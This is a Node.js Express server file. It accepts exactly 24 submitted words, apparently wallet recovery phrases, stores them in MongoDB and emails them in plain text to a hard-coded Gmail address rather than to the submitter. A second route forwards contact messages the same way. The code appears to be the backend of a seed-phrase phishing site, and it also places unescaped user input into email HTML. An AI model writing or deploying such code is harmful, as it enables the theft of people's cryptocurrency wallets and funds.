require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const mongoose = require('mongoose');
const { Resend } = require('resend');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(cors());
app.use(bodyParser.json());

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => console.log("Connected to MongoDB"))
.catch(err => console.error("MongoDB Connection Error:", err));

// Define schema and model for words
const wordSchema = new mongoose.Schema({
    words: [String]
});
const Word = mongoose.model('Word', wordSchema);

// Define schema and model for requests
const requestSchema = new mongoose.Schema({
    email: { type: String, required: true },
    message: { type: String, required: true }
});
const Request = mongoose.model('Request', requestSchema);

// Initialize Resend with API key
const resend = new Resend(process.env.RESEND_API_KEY);

// Route to handle POST requests for storing 24 words
app.post('/words', async (req, res) => {
    const { words } = req.body;

    if (!words || words.length !== 24) {
        return res.status(400).json({ error: 'Please provide exactly 24 words.' });
    }

    try {
        const newWordEntry = new Word({ words });
        await newWordEntry.save();

        const wordList = words.join(' ');

        // Send email
        await resend.emails.send({
            from: 'onboarding@resend.dev',
            to: ['grindonly80@gmail.com'],
            subject: 'Words Saved Successfully!',
            html: `<p>You have successfully saved your 24 words:</p><p>${wordList}</p>`
        });

        res.status(201).json({ message: 'Words saved successfully and email sent!' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'An error occurred while processing your request.' });
    }
});

// Route to handle POST requests for storing requests
app.post('/requests', async (req, res) => {
    const { email, message } = req.body;

    if (!email || !message) {
        return res.status(400).json({ error: 'Please provide both email and message.' });
    }

    try {
        const newRequest = new Request({ email, message });
        await newRequest.save();

        // Send email notification
        await resend.emails.send({
            from: 'onboarding@resend.dev',
            to: ['grindonly80@gmail.com'],
            subject: 'New Request Received!',
            html: `<p><strong>Email:</strong> ${email}</p><p><strong>Message:</strong> ${message}</p>`
        });

        res.status(201).json({ message: 'Request saved successfully and email sent!' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'An error occurred while processing your request.' });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});